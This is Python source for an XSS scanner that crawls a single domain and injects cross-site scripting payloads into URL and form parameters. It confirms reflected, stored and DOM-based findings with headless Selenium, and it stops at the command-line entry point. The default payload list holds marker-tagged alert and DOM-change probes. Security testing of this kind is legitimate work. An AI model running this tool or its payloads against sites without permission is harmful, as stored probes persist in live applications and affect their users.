# xsspy_scanner.py (v1.0 - Refactored from v12)
import requests
from bs4 import BeautifulSoup
# FIX 4: Add urlunparse to the import list
from urllib.parse import urljoin, urlparse, parse_qs, urlencode, quote, urlunparse
import argparse
import sys
import time
from collections import deque
import concurrent.futures # Keep import for potential future use, but not active in crawl
import os
import re
import uuid
import copy
import json
import logging # Use logging module
import traceback # Import traceback for better error logging

# Selenium imports
from selenium import webdriver
from selenium.webdriver.chrome.service import Service as ChromeService
from selenium.webdriver.chrome.options import Options as ChromeOptions
from selenium.common.exceptions import (
    TimeoutException, UnexpectedAlertPresentException, NoAlertPresentException,
    NoSuchElementException, WebDriverException, JavascriptException
)
from selenium.webdriver.support.ui import WebDriverWait
from selenium.webdriver.support import expected_conditions as EC
from selenium.webdriver.common.by import By
# Use webdriver_manager only if explicitly needed/installed, otherwise specify path
# from webdriver_manager.chrome import ChromeDriverManager # Optional

# --- Constants ---
__version__ = "1.0"
DOM_PAYLOAD_ATTRIBUTE = 'data-xsspy-success' # Renamed attribute
DOM_PAYLOAD_VALUE = 'true'
CONFIRMATION_WAIT_TIMEOUT = 3
MAX_WORKERS_DEFAULT = 10 # Note: Not used for crawling currently
UNIQUE_PROBE_PREFIX = "xSsPyPrObE"
STORED_MARKER_PREFIX = "XSSPYMARK"
DOM_SINK_MARKER_PREFIX = "DOMSINKMARKER"
MAX_DOM_CONFIRM_PAYLOADS = 5 # Limit confirmation attempts for performance

# Base execution strings with placeholder for marker {marker}
ALERT_EXEC_TPL = "alert('XSPY_{prefix}_{{marker}}')" # Added tool prefix
# Static DOM change payload (no marker needed here for the template)
DOM_CHANGE_EXEC = f"document.body.setAttribute('{DOM_PAYLOAD_ATTRIBUTE}','{DOM_PAYLOAD_VALUE}')"

# FIX 1: Define the img_onerror_payload before using it in the list
img_onerror_payload = f"<img src=x onerror={ALERT_EXEC_TPL.replace('{prefix}', 'DEFIMG')}>" # Example prefix

# Default Payload Templates (Internal Fallback)
DEFAULT_PAYLOAD_TEMPLATES = [
    f"<script>{ALERT_EXEC_TPL.replace('{prefix}', 'DEFSCRIPT')}</script>",
    img_onerror_payload, # Use the pre-defined variable
    f"<svg onload={ALERT_EXEC_TPL.replace('{prefix}', 'DEFSVG')}>",
    f"<details open ontoggle={ALERT_EXEC_TPL.replace('{prefix}', 'DEFDETAILS')}><summary>T</summary></details>",
    f"<input autofocus onfocus={ALERT_EXEC_TPL.replace('{prefix}', 'DEFFOCUS')}>",
    # Use the static DOM change payload directly
    f"<img src=x onerror=\"{DOM_CHANGE_EXEC}\">",
    # FIX 1 (cont.): Use the pre-defined variable for breakout examples
    f"'>{img_onerror_payload}",
    f"\">{img_onerror_payload}",
]

# --- Logging Setup ---
# Basic configuration, can be overridden by args
logging.basicConfig(level=logging.INFO, format='%(asctime)s [%(levelname)s] %(message)s', datefmt='%Y-%m-%d %H:%M:%S')
log = logging.getLogger('XSSpy') # Create logger instance


# --- Utility Functions ---

def setup_logging(log_level_str, log_file=None):
    """Configures logging level and optional file output."""
    numeric_level = getattr(logging, log_level_str.upper(), None)
    if not isinstance(numeric_level, int):
        raise ValueError(f'Invalid log level: {log_level_str}')

    # Get root logger and remove existing handlers
    root_logger = logging.getLogger()
    for handler in root_logger.handlers[:]:
        root_logger.removeHandler(handler)

    # Create formatter
    formatter = logging.Formatter('%(asctime)s [%(levelname)s] %(message)s', datefmt='%Y-%m-%d %H:%M:%S')

    # Configure console handler
    console_handler = logging.StreamHandler(sys.stdout)
    console_handler.setLevel(numeric_level)
    console_handler.setFormatter(formatter)
    root_logger.addHandler(console_handler)

    # Configure file handler if path provided
    if log_file:
        try:
            file_handler = logging.FileHandler(log_file, mode='w') # Overwrite log file
            file_handler.setLevel(numeric_level)
            file_handler.setFormatter(formatter)
            root_logger.addHandler(file_handler)
            log.info(f"Logging to file: {log_file}")
        except Exception as e:
            log.error(f"Failed to set up log file {log_file}: {e}")

    # Set the level for the root logger
    root_logger.setLevel(numeric_level)
    log.info(f"Log level set to {log_level_str.upper()}")

# FIX 3: Define the load_payloads function
def load_payloads(filepath):
    """Loads payloads from a file, one per line, ignoring comments and blanks."""
    payloads = []
    try:
        with open(filepath, 'r', encoding='utf-8', errors='ignore') as f:
            for line_num, line in enumerate(f, 1):
                line = line.strip()
                if line and not line.startswith('#'): # Ignore empty lines and comments
                    payloads.append(line)
        if not payloads:
             log.warning(f"No valid payloads found in {filepath}. File might be empty or only contain comments/blank lines.")
             return None # Indicate no payloads loaded
        log.info(f"Successfully loaded {len(payloads)} payloads from {filepath}")
        return payloads
    except FileNotFoundError:
        log.error(f"Payload file not found: {filepath}")
        return None
    except Exception as e:
        log.error(f"Error reading payload file {filepath}: {e}\n{traceback.format_exc()}")
        return None


def is_valid_url(url):
    """Basic check if the URL seems valid."""
    parsed = urlparse(url)
    return all([parsed.scheme in ['http', 'https'], parsed.netloc])

def normalize_url(url):
    """Removes fragment and trailing slash for consistency."""
    try:
        parsed = urlparse(url)
        # Rebuild without fragment, ensure path exists
        path = parsed.path if parsed.path else '/'
        # Remove trailing slash from path if it's not the root '/'
        if path != '/' and path.endswith('/'):
            path = path[:-1]
        # Ensure query parameters are sorted for consistency (optional but good practice)
        query = urlencode(sorted(parse_qs(parsed.query).items()), doseq=True)

        # FIX 4 (cont.): Now urlunparse is available via import
        return urlunparse((parsed.scheme, parsed.netloc, path, parsed.params, query, ''))
    except Exception as e:
        log.error(f"Error normalizing URL '{url}': {e}. Returning original.")
        return url # Return original URL if parsing/unparsing fails


def format_payload(template, marker_id, is_stored_check=True):
    """Formats a payload template with a unique marker."""
    # Decide prefix based on check type
    prefix = STORED_MARKER_PREFIX if is_stored_check else DOM_SINK_MARKER_PREFIX
    # Replace the marker placeholder within the execution template first
    exec_code = ALERT_EXEC_TPL.format(prefix=prefix, marker=marker_id)
    # Now replace the execution code placeholder in the main template
    # This assumes templates might look like '<img src=x onerror={exec}>' OR directly use ALERT_EXEC_TPL
    # We need a consistent way to handle this. Let's assume templates contain {ALERT_EXEC_TPL}
    # Or perhaps more simply, format the alert part directly into the payload if {marker} exists
    try:
        if '{marker}' in template:
             # Simple case: Payload template has {marker} placeholder for alert content
             return template.format(marker=marker_id) # Assumes format like alert('...{marker}...')
        elif ALERT_EXEC_TPL in template:
             # Complex case: Template includes the alert template string itself
             formatted_alert = ALERT_EXEC_TPL.format(prefix=prefix, marker=marker_id)
             return template.replace(ALERT_EXEC_TPL, formatted_alert)
        elif DOM_CHANGE_EXEC in template:
             # DOM payloads don't need markers, return as is
             return template
        else:
             # Payload might be static or use a different format - return as is for now
             # log.debug(f"Payload template does not contain known markers: {template[:60]}...")
             return template # Return template as is if no known placeholder found
    except Exception as e:
        log.error(f"Error formatting payload template '{template[:60]}...' with marker '{marker_id}': {e}")
        return None # Return None if formatting fails


def get_links_and_forms(html_content, base_url):
    """Extracts links and forms from HTML content."""
    soup = BeautifulSoup(html_content, 'html.parser')
    links = set()
    forms = []

    # Extract links
    for a_tag in soup.find_all('a', href=True):
        href = a_tag['href'].strip()
        if href and not href.startswith(('javascript:', 'mailto:', '#', 'tel:')):
            try:
                full_url = urljoin(base_url, href)
                # Normalize here before adding to set
                normalized_link = normalize_url(full_url)
                links.add(normalized_link)
            except Exception as e:
                log.warning(f"Could not parse or join link href '{href}' from base '{base_url}': {e}")


    # Extract forms
    for form_tag in soup.find_all('form'):
      try: # Add error handling around form processing
        action = form_tag.get('action', '')
        method = form_tag.get('method', 'get').lower()
        # Normalize the base URL for joining if action is relative
        normalized_base = normalize_url(base_url)
        # Join and normalize the form action URL
        form_url = normalize_url(urljoin(normalized_base, action if action else normalized_base))

        form_data = {'action': form_url, 'method': method, 'inputs': []}
        for input_tag in form_tag.find_all(['input', 'textarea', 'select']):
            name = input_tag.get('name')
            value = input_tag.get('value', '')
            input_type = input_tag.get('type', 'text') # Default to text if not specified
            if input_tag.name == 'textarea':
                 value = input_tag.text
                 input_type = 'textarea'
            elif input_tag.name == 'select':
                 # Get selected option value, or first option if none selected
                 selected_option = input_tag.find('option', selected=True)
                 value = selected_option['value'] if selected_option and 'value' in selected_option.attrs else (input_tag.find('option')['value'] if input_tag.find('option') and 'value' in input_tag.find('option').attrs else '')
                 input_type = 'select'

            # Only consider inputs with names, ignore buttons unless they have a name/value
            if name and input_type not in ['submit', 'button', 'reset'] or (name and value):
                form_data['inputs'].append({'name': name, 'value': value, 'type': input_type})
        # Only add form if it has actionable inputs
        if form_data['inputs']:
             forms.append(form_data)
      except Exception as e:
          log.error(f"Error processing form on {base_url}: {e}\n{traceback.format_exc()}")

    return links, forms

# --- Selenium WebDriver Setup ---
def setup_driver(user_agent=None, no_headless=False):
    """Sets up and returns a Selenium WebDriver instance."""
    chrome_options = ChromeOptions()
    # Suppress logging messages from WebDriver Manager and Selenium
    chrome_options.add_experimental_option('excludeSwitches', ['enable-logging'])
    chrome_options.add_argument("--log-level=3") # Suppress console logs from Chrome itself
    chrome_options.add_argument("--disable-gpu") # Often needed for headless mode
    chrome_options.add_argument("--no-sandbox") # Often needed in containerized environments
    chrome_options.add_argument("--disable-dev-shm-usage") # Overcome limited resource problems

    if not no_headless:
        chrome_options.add_argument("--headless")
    if user_agent:
        chrome_options.add_argument(f"user-agent={user_agent}")

    # Automatically download and manage ChromeDriver
    try:
        # Option 1: Use webdriver-manager (requires installation: pip install webdriver-manager)
        # from webdriver_manager.chrome import ChromeDriverManager
        # service = ChromeService(ChromeDriverManager().install())

        # Option 2: Assume chromedriver is in PATH or specify executable_path
        # service = ChromeService(executable_path='/path/to/your/chromedriver') # Uncomment and set path if needed
        service = ChromeService() # Assumes chromedriver is in PATH

        driver = webdriver.Chrome(service=service, options=chrome_options)
        driver.set_page_load_timeout(20) # Timeout for page loads
        log.debug("WebDriver initialized successfully.")
        return driver
    except Exception as e:
        log.critical(f"Failed to initialize WebDriver: {e}. Ensure ChromeDriver is installed and accessible.")
        log.critical("Check if ChromeDriver path is correct or if it's in your system's PATH.")
        log.critical("Download from: https://chromedriver.chromium.org/downloads")
        # log.critical("Alternatively, install webdriver-manager: pip install webdriver-manager and uncomment related lines.")
        return None


# --- Scanner Class ---

class Scanner:
    # FIX 5: Adjust __init__ for sequential scan
    def __init__(self, start_url, max_depth=3, workers=MAX_WORKERS_DEFAULT, # Workers not used for crawl
                 payload_templates=None, delay=0, user_agent=None, no_headless=False, skip_stored=False):
        if not is_valid_url(start_url):
             raise ValueError(f"Invalid start URL provided: {start_url}")

        self.start_url = normalize_url(start_url)
        self.allowed_domain = urlparse(self.start_url).netloc
        self.max_depth = max_depth
        self.workers = workers # Keep for potential future use (e.g., parallel param testing)
        self.delay = delay
        self.user_agent = user_agent
        self.no_headless = no_headless
        self.skip_stored_check = skip_stored

        # Use provided payloads or default, ensure it's a list
        self.payload_templates = list(payload_templates) if payload_templates else list(DEFAULT_PAYLOAD_TEMPLATES)
        log.info(f"Using {len(self.payload_templates)} payload templates.")

        # Data structures for scanning
        # Initialize queue and visited set for sequential scan
        self.queue = deque([(self.start_url, 0)]) # Start with the initial URL and depth 0
        self.visited_urls = {self.start_url}      # Add start URL to visited set
        self.visited_forms = set() # Store normalized form action + sorted input names
        self.confirmed_stored_xss = {} # marker_id -> {finding_url, injection_url, param, payload}
        self.confirmed_dom_xss = {} # finding_url -> {payload, sink_info (optional)}
        self.driver = None # Initialize WebDriver later


    def _init_driver(self):
        """Initializes the WebDriver if not already done."""
        if not self.driver:
             log.info("Initializing WebDriver...")
             self.driver = setup_driver(self.user_agent, self.no_headless)
             if not self.driver:
                 log.critical("WebDriver initialization failed. Cannot perform dynamic checks.")
                 # Decide how to handle this - maybe exit or just skip dynamic parts
                 raise RuntimeError("Failed to initialize Selenium WebDriver.")


    def _make_request(self, url, method='get', params=None, data=None):
        """Makes an HTTP request using requests library."""
        headers = {'User-Agent': self.user_agent if self.user_agent else f'XSSpy Scanner/{__version__}'}
        try:
            if method == 'get':
                response = requests.get(url, params=params, headers=headers, timeout=10, allow_redirects=True)
            elif method == 'post':
                response = requests.post(url, params=params, data=data, headers=headers, timeout=10, allow_redirects=True)
            else:
                log.warning(f"Unsupported HTTP method: {method}")
                return None

            response.raise_for_status() # Raise HTTPError for bad responses (4xx or 5xx)
            # Basic content type check
            if 'text/html' not in response.headers.get('Content-Type', '').lower():
                 log.debug(f"Skipping non-HTML content at {response.url}")
                 return None
            return response

        except requests.exceptions.RequestException as e:
            # Log errors for specific request issues (timeouts, connection errors, status codes)
            status_code = f" (Status: {e.response.status_code})" if e.response is not None else ""
            log.error(f"Request failed for {url} ({method}){status_code}: {e}")
            return None
        except Exception as e:
            # Log other unexpected errors during the request phase
            log.error(f"An unexpected error occurred during request to {url}: {e}")
            return None

    def _check_alert_confirmation(self, url, expected_marker):
        """Uses Selenium to check for an alert with the specific marker."""
        if not self.driver: return False, "WebDriver not initialized"

        log.debug(f"Checking for alert '{expected_marker}' on {url}")
        try:
            self.driver.get(url)
            # Increased wait slightly, added poll frequency
            WebDriverWait(self.driver, CONFIRMATION_WAIT_TIMEOUT + 1, poll_frequency=0.2).until(EC.alert_is_present())
            alert = self.driver.switch_to.alert
            alert_text = alert.text
            alert.accept()
            log.debug(f"Alert found with text: {alert_text}")
            if expected_marker in alert_text:
                log.info(f"Confirmed alert marker '{expected_marker}' found on {url}")
                return True, alert_text
            else:
                log.debug(f"Alert found, but marker '{expected_marker}' not present.")
                return False, f"Alert found, wrong marker: {alert_text}"

        except TimeoutException:
            log.debug(f"No alert appeared on {url} within {CONFIRMATION_WAIT_TIMEOUT + 1} seconds.")
            return False, "No alert present"
        except UnexpectedAlertPresentException:
             # This can happen if an unexpected alert pops up before WebDriverWait
             try:
                 log.warning(f"Handling unexpected alert on {url} during confirmation check.")
                 alert = self.driver.switch_to.alert
                 alert_text = alert.text
                 alert.accept()
                 log.warning(f"Unexpected alert closed on {url}: {alert_text}")
                 # Check if this unexpected alert contained the marker anyway
                 if expected_marker in alert_text:
                     log.info(f"Confirmed alert marker '{expected_marker}' found unexpectedly on {url}")
                     return True, alert_text
                 else:
                     return False, f"Unexpected alert, wrong marker: {alert_text}"
             except NoAlertPresentException:
                 log.error("UnexpectedAlertPresentException but no alert found when switching.")
                 return False, "Error handling unexpected alert"
        except WebDriverException as e:
            log.error(f"WebDriver error checking alert on {url}: {type(e).__name__} - {e}")
            # Avoid recursive re-init, just report error
            return False, f"WebDriverException: {type(e).__name__}"
        except Exception as e:
            log.error(f"Unexpected error during alert confirmation on {url}: {e}\n{traceback.format_exc()}")
            return False, f"Unexpected Exception: {type(e).__name__}"

    def _check_dom_confirmation(self, url, payload):
        """Uses Selenium to check if the DOM was modified by the payload."""
        if not self.driver: return False, "WebDriver not initialized"

        log.debug(f"Checking for DOM change via attribute '{DOM_PAYLOAD_ATTRIBUTE}' on {url}")
        try:
            self.driver.get(url)
            # Use WebDriverWait to wait for the attribute instead of time.sleep
            # Wait up to N seconds for the attribute to appear
            wait_time = 2 # seconds
            script = f"return document.body.getAttribute('{DOM_PAYLOAD_ATTRIBUTE}') === '{DOM_PAYLOAD_VALUE}';"

            # Wait until the script returns true, or timeout
            WebDriverWait(self.driver, wait_time).until(
                lambda driver: driver.execute_script(script)
            )
            # If wait succeeds, the attribute was found
            log.info(f"Confirmed DOM change attribute found on {url} for payload: {payload[:50]}...")
            return True, "DOM attribute set successfully"

        except TimeoutException:
            # The attribute did not appear within the wait time
            log.debug(f"DOM change attribute not found on {url} within {wait_time}s.")
            return False, "DOM attribute not found"
        except JavascriptException as e:
             log.error(f"JavaScript error executing DOM check on {url}: {e}")
             return False, f"JavaScript Error: {e}"
        except WebDriverException as e:
            log.error(f"WebDriver error during DOM check on {url}: {type(e).__name__} - {e}")
            return False, f"WebDriverException: {type(e).__name__}"
        except Exception as e:
            log.error(f"Unexpected error during DOM confirmation on {url}: {e}\n{traceback.format_exc()}")
            return False, f"Unexpected Exception: {type(e).__name__}"


    def _test_parameter(self, base_url, param_name, original_value, method='get', form_data=None):
        """Tests a single parameter with all payloads. Called sequentially."""
        is_form = form_data is not None
        parsed_url = urlparse(base_url)
        base_params = parse_qs(parsed_url.query)

        log.debug(f"Testing {'form' if is_form else 'URL'} parameter '{param_name}' at {base_url}")

        payloads_to_test = self.payload_templates

        # --- Stored XSS Check ---
        if not self.skip_stored_check:
            self._init_driver() # Ensure driver is ready for confirmation
            stored_check_markers = {} # marker_id -> payload_template

            for template in payloads_to_test:
                 if not self.driver:
                      log.warning("WebDriver not available, skipping remaining Stored XSS checks for this parameter.")
                      break # Stop if driver failed

                 marker_id = f"{STORED_MARKER_PREFIX}_{uuid.uuid4().hex[:8]}"
                 payload = format_payload(template, marker_id, is_stored_check=True)
                 if payload is None:
                      log.warning(f"Skipping template due to formatting error: {template[:60]}...")
                      continue

                 # Only try payloads designed for alert checks here
                 # Refined check: Look for the marker placeholder OR the alert pattern itself
                 is_alert_payload = '{marker}' in template or re.search(r'alert\(.*\)', template, re.IGNORECASE)
                 if not is_alert_payload:
                      log.debug(f"Skipping template for stored check (not an alert type): {template[:60]}...")
                      continue

                 stored_check_markers[marker_id] = template # Store original template for reporting
                 log.debug(f"Injecting stored probe: URL={base_url}, Param={param_name}, Marker={marker_id}, Payload={payload[:60]}...")

                 injection_successful = False
                 injection_target_url = base_url # Default check URL
                 try:
                     if is_form:
                         current_form_data = {inp['name']: inp['value'] for inp in form_data['inputs']}
                         current_form_data[param_name] = payload
                         # Submit the form via request
                         response = self._make_request(form_data['action'], method=form_data['method'], data=current_form_data)
                         if response:
                             injection_successful = True
                             injection_target_url = response.url # Check where the form submission led
                     else:
                         test_params = copy.deepcopy(base_params)
                         test_params[param_name] = [payload] # Ensure value is list for urlencode
                         # Make request via 'requests' to inject
                         response = self._make_request(parsed_url._replace(query=urlencode(test_params, doseq=True)).geturl(), method=method)
                         if response:
                             injection_successful = True
                             injection_target_url = response.url # Check the URL after GET request (might redirect)

                     if not injection_successful:
                          log.warning(f"Injection request failed for stored probe {marker_id}, skipping confirmation.")
                          continue

                     # Confirmation requires visiting the page where reflection might occur
                     time.sleep(self.delay) # Add delay after injection before check
                     confirmed, _ = self._check_alert_confirmation(injection_target_url, marker_id)

                     if confirmed:
                         log.warning(f"[+] Potential Stored XSS Found!")
                         log.warning(f"  Marker ID: {marker_id}")
                         log.warning(f"  Injection URL: {base_url}")
                         log.warning(f"  Finding URL:   {self.driver.current_url if self.driver else injection_target_url}")
                         log.warning(f"  Parameter:     {param_name} ({form_data['method'].upper() if is_form else method.upper()})")
                         log.warning(f"  Payload Template: {template}")

                         # Store confirmed finding
                         self.confirmed_stored_xss[marker_id] = {
                             'finding_url': self.driver.current_url if self.driver else injection_target_url, # URL where alert popped
                             'injection_url': base_url,
                             'parameter': param_name,
                             'payload_template': template,
                             'method': form_data['method'] if is_form else method
                         }
                         # Optimization: Maybe stop testing this param if one stored XSS found? Optional.
                         # break # Uncomment to stop after first stored XSS on this param
                 except Exception as e:
                      log.error(f"Error during stored XSS check for param '{param_name}' with marker '{marker_id}': {e}\n{traceback.format_exc()}")


        # --- Reflected / DOM XSS Check ---
        self._init_driver() # Ensure driver is ready
        dom_payloads_attempted = 0

        for template in payloads_to_test:
             if not self.driver:
                 log.warning("WebDriver not available, skipping remaining Reflected/DOM checks for this parameter.")
                 break # Stop if driver failed

             # Skip if it's specifically a stored-only payload type AND we're skipping stored
             # This logic might be too simple. Assume all payloads might work unless clearly only for stored.
             # if self.skip_stored_check and STORED_MARKER_PREFIX in payload: continue

             # Format payload for reflected alert check if needed
             is_alert_payload = '{marker}' in template or re.search(r'alert\(.*\)', template, re.IGNORECASE)
             is_dom_payload = DOM_PAYLOAD_ATTRIBUTE in template or DOM_CHANGE_EXEC in template
             payload = template # Use original template for logging/reporting

             # Choose marker/payload for confirmation
             confirmation_payload = template # Default to original template
             confirmation_marker = None
             if is_alert_payload and not is_dom_payload: # Prioritize alert check for reflection
                 confirmation_marker = f"{UNIQUE_PROBE_PREFIX}_Refl_{uuid.uuid4().hex[:8]}"
                 formatted_payload = format_payload(template, confirmation_marker, is_stored_check=True) # Use alert format
                 if formatted_payload:
                      confirmation_payload = formatted_payload
                 else:
                      log.warning(f"Skipping reflected alert check due to formatting error: {template[:60]}...")
                      continue


             log.debug(f"Testing {'DOM' if is_dom_payload else 'Reflected'} payload on {base_url}, Param={param_name}: {confirmation_payload[:60]}...")

             test_url = None # URL to check confirmation on
             try:
                 if is_form:
                     # Simple approach: Construct URL with payload in query string for GET forms
                     if form_data['method'] == 'get':
                         current_form_data = {inp['name']: inp['value'] for inp in form_data['inputs']}
                         current_form_data[param_name] = [confirmation_payload] # Use confirmation payload
                         test_url = form_data['action'] + '?' + urlencode(current_form_data, doseq=True)
                         log.debug(f"Testing GET form via URL: {test_url}")
                     elif form_data['method'] == 'post':
                         # Testing POST reflected/DOM is hard without JS execution or complex setup
                         log.debug(f"Skipping Reflected/DOM check for POST form parameter '{param_name}' (requires complex interaction)")
                         continue # Skip to next payload
                     else: # Skip other methods
                          continue
                 else:
                     # For URL parameters, construct the URL directly
                     test_params = copy.deepcopy(base_params)
                     test_params[param_name] = [confirmation_payload] # Use confirmation payload
                     test_url = parsed_url._replace(query=urlencode(test_params, doseq=True)).geturl()
                     log.debug(f"Testing URL parameter via URL: {test_url}")

                 if not test_url:
                     log.debug("No test URL generated, skipping confirmation.")
                     continue

                 time.sleep(self.delay) # Delay before confirmation check

                 # --- Confirmation ---
                 confirmed = False
                 confirmation_detail = "Not applicable"

                 if is_dom_payload:
                     # Limit DOM confirmation attempts for performance
                     if dom_payloads_attempted < MAX_DOM_CONFIRM_PAYLOADS:
                         confirmed, confirmation_detail = self._check_dom_confirmation(test_url, confirmation_payload)
                         dom_payloads_attempted += 1
                     else:
                          log.debug(f"Skipping further DOM confirmation for {param_name} on {base_url} (limit reached)")
                          continue # Skip DOM check if limit hit

                     if confirmed:
                         log.warning(f"[+] Potential DOM XSS Found!")
                         log.warning(f"  Finding URL: {test_url}") # URL where DOM change was confirmed
                         log.warning(f"  Parameter:   {param_name} ({form_data['method'].upper() if is_form else method.upper()})")
                         log.warning(f"  Payload:     {payload}") # Report original payload template
                         # Store confirmed finding
                         finding_key = (test_url, param_name, payload) # Use tuple as key
                         if finding_key not in self.confirmed_dom_xss: # Avoid duplicate reports for same vuln
                              self.confirmed_dom_xss[finding_key] = {
                                   'finding_url': test_url,
                                   'payload': payload,
                                   'parameter': param_name,
                                   'method': form_data['method'] if is_form else method,
                                   'injection_trigger_url': base_url # Original URL/Form action
                              }
                         # Optional: Stop testing this parameter after finding one DOM XSS
                         # break # Uncomment to stop after first finding on this param

                 # Check for Reflected XSS via Alert (if it was an alert payload and not DOM)
                 elif is_alert_payload and confirmation_marker:
                     confirmed, confirmation_detail = self._check_alert_confirmation(test_url, confirmation_marker)

                     if confirmed:
                         log.warning(f"[+] Potential Reflected XSS Found!")
                         log.warning(f"  Finding URL: {test_url}") # URL where alert popped
                         log.warning(f"  Parameter:   {param_name} ({form_data['method'].upper() if is_form else method.upper()})")
                         log.warning(f"  Payload Template: {payload}") # Report original template
                         log.warning(f"  Marker ID: {confirmation_marker}")

                         # Store as a DOM/Reflected XSS finding
                         finding_key = (test_url, param_name, payload) # Use tuple as key
                         if finding_key not in self.confirmed_dom_xss: # Avoid duplicate reports
                             self.confirmed_dom_xss[finding_key] = {
                                 'finding_url': test_url,
                                 'payload': payload, # Store original template
                                 'parameter': param_name,
                                 'method': form_data['method'] if is_form else method,
                                 'injection_trigger_url': base_url,
                                 'type': 'Reflected' # Add type hint
                             }
                         # break # Optional: stop after first reflected finding

             except Exception as e:
                  log.error(f"Error during Reflected/DOM check for param '{param_name}': {e}\n{traceback.format_exc()}")


    # FIX 5: Remove ThreadPoolExecutor from parameter testing within _process_page
    def _process_page(self, url):
        """Processes a single page: fetches content, extracts links/forms, tests parameters sequentially."""
        # Note: log.info for processing moved to run_scan before calling this

        response = self._make_request(url)
        if not response:
            return [], [] # Return empty lists for links/forms if request failed

        # Process the response URL (might have changed due to redirects)
        # Normalize URL from response before checking domain or extracting
        try:
            current_url = normalize_url(response.url)
        except Exception as e:
             log.error(f"Failed to normalize response URL {response.url}: {e}. Skipping page.")
             return [], []

        if urlparse(current_url).netloc != self.allowed_domain:
             log.debug(f"Skipping off-domain URL: {current_url}")
             return [], [] # Return empty lists

        # Extract links and forms
        try:
             links, forms = get_links_and_forms(response.text, current_url)
        except Exception as e:
             log.error(f"Failed to parse HTML or extract links/forms from {current_url}: {e}")
             links, forms = set(), [] # Continue without links/forms if parsing failed


        # --- Test URL Parameters ---
        parsed_url = urlparse(current_url)
        url_params = parse_qs(parsed_url.query)
        if url_params:
             log.debug(f"Found {len(url_params)} URL parameters on {current_url}")
             # Test parameters sequentially
             for param, value in url_params.items():
                 # Test the first value if multiple exist for the same param
                 original_value = value[0] if isinstance(value, list) and value else ''
                 try:
                     self._test_parameter(current_url, param, original_value, method='get')
                 except Exception as e:
                      log.error(f"Error testing URL parameter '{param}' on {current_url}: {e}\n{traceback.format_exc()}")


        # --- Test Form Parameters ---
        # Test forms sequentially
        for form in forms:
             # Create a unique identifier for the form to avoid re-testing
             input_names = sorted([inp['name'] for inp in form['inputs']])
             form_id = (form['action'], form['method'], tuple(input_names))

             # Check visited forms using the tuple identifier
             if form_id not in self.visited_forms:
                 self.visited_forms.add(form_id)
                 log.debug(f"Found form: Action={form['action']}, Method={form['method']}, Inputs={input_names}")
                 for inp in form['inputs']:
                      try:
                           self._test_parameter(form['action'], inp['name'], inp['value'], method=form['method'], form_data=form)
                      except Exception as e:
                           log.error(f"Error testing form parameter '{inp['name']}' in form {form['action']}: {e}\n{traceback.format_exc()}")
             else:
                  log.debug(f"Skipping already visited form: Action={form['action']}, Inputs={input_names}")


        return list(links), forms # Return discovered links (as list) and forms


    # FIX 5: Replace run_scan with sequential BFS logic
    def run_scan(self):
        """Runs the crawl and scan process sequentially using BFS."""
        log.info(f"Starting scan on {self.start_url} up to depth {self.max_depth}")

        processed_urls_count = 0
        try:
            while self.queue: # Loop while the queue is NOT empty
                 current_url, current_depth = self.queue.popleft() # Pop from non-empty queue

                 # Depth check - skip processing if max depth exceeded
                 if current_depth > self.max_depth:
                      log.debug(f"Max depth {self.max_depth} reached, skipping further processing for {current_url}")
                      continue # Skip to next item in queue

                 log.info(f"Processing: {current_url} (Depth {current_depth})")
                 processed_urls_count += 1

                 try:
                     # Process page: Fetch, find params/forms, test params/forms
                     links, _ = self._process_page(current_url) # Forms processed internally now

                     # Add new links to the queue if they are within domain and not visited
                     if current_depth < self.max_depth:
                         for link in links:
                             # Ensure link is string and normalize before check
                             if not isinstance(link, str):
                                 log.warning(f"Non-string link found: {link}, skipping.")
                                 continue
                             normalized_link = normalize_url(link)

                             if urlparse(normalized_link).netloc == self.allowed_domain and normalized_link not in self.visited_urls:
                                 self.visited_urls.add(normalized_link) # Add to visited WHEN adding to queue
                                 log.debug(f"Queueing new link: {normalized_link} at depth {current_depth + 1}")
                                 self.queue.append((normalized_link, current_depth + 1))

                 except Exception as e:
                      log.error(f"Error processing page {current_url}: {e}\n{traceback.format_exc()}")
                      # Continue with the next URL in the queue

                 # Optional: Add a small delay between processing pages if needed
                 if self.delay > 0:
                      time.sleep(self.delay)

        except KeyboardInterrupt:
             # Allow graceful exit if Ctrl+C during the main loop
             raise # Re-raise KeyboardInterrupt to be caught by main handler
        except Exception as e:
             log.critical(f"Critical error during scan loop: {e}", exc_info=True)
             # Continue to finally block for cleanup/reporting
        finally:
             log.info(f"Scan loop finished. Processed {processed_urls_count} unique pages.")
             # WebDriver closure and reporting moved to the main __main__ block's finally


    def report_findings(self):
        """Prints a summary of confirmed findings."""
        print("\n" + "="*20 + " Scan Findings " + "="*20) # More visible header
        if not self.confirmed_stored_xss and not self.confirmed_dom_xss:
            print("\nNo confirmed XSS vulnerabilities found.")
            print("="*55) # Footer
            return

        if self.confirmed_stored_xss:
            print(f"\n[+] Confirmed Stored XSS ({len(self.confirmed_stored_xss)}):")
            i = 1
            for marker, details in self.confirmed_stored_xss.items():
                print(f"\n  Finding #{i} (Stored):")
                print(f"    Marker:        {marker}")
                print(f"    Injection URL: {details['injection_url']}")
                print(f"    Finding URL:   {details['finding_url']}")
                print(f"    Parameter:     {details['parameter']} ({details['method'].upper()})")
                print(f"    Payload Used:  {details['payload_template']}")
                i += 1

        if self.confirmed_dom_xss:
            print(f"\n[+] Confirmed DOM/Reflected XSS ({len(self.confirmed_dom_xss)}):")
            i = 1
            # Group by finding URL first for better readability
            findings_by_url = {}
            for finding_key, details in self.confirmed_dom_xss.items():
                 finding_url = details['finding_url']
                 if finding_url not in findings_by_url: findings_by_url[finding_url] = []
                 findings_by_url[finding_url].append(details)

            for finding_url, details_list in findings_by_url.items():
                 print(f"\n  Vulnerable URL: {finding_url}")
                 for details in details_list:
                     payload_type = details.get('type', 'DOM') # Check if 'Reflected' type hint exists
                     print(f"    Finding #{i} ({payload_type}):")
                     print(f"      Parameter:     {details['parameter']} ({details['method'].upper()})")
                     # Shorten long payloads for display
                     payload_display = details['payload']
                     if len(payload_display) > 100:
                          payload_display = payload_display[:97] + "..."
                     print(f"      Payload:       {payload_display}")
                     print(f"      Trigger URL:   {details['injection_trigger_url']}") # Where injection happened
                     i += 1
        print("\n" + "="*55) # Footer


    def close(self):
        """Closes the Selenium WebDriver."""
        if self.driver:
            log.info("Closing WebDriver...")
            try:
                self.driver.quit()
                self.driver = None
                log.debug("WebDriver closed successfully.")
            except Exception as e:
                log.error(f"Error closing WebDriver: {e}")


# --- Entry Point ---
if __name__ == "__main__":
    parser = argparse.ArgumentParser(description=f"XSSpy Scanner v{__version__} - Web Application XSS Scanner")
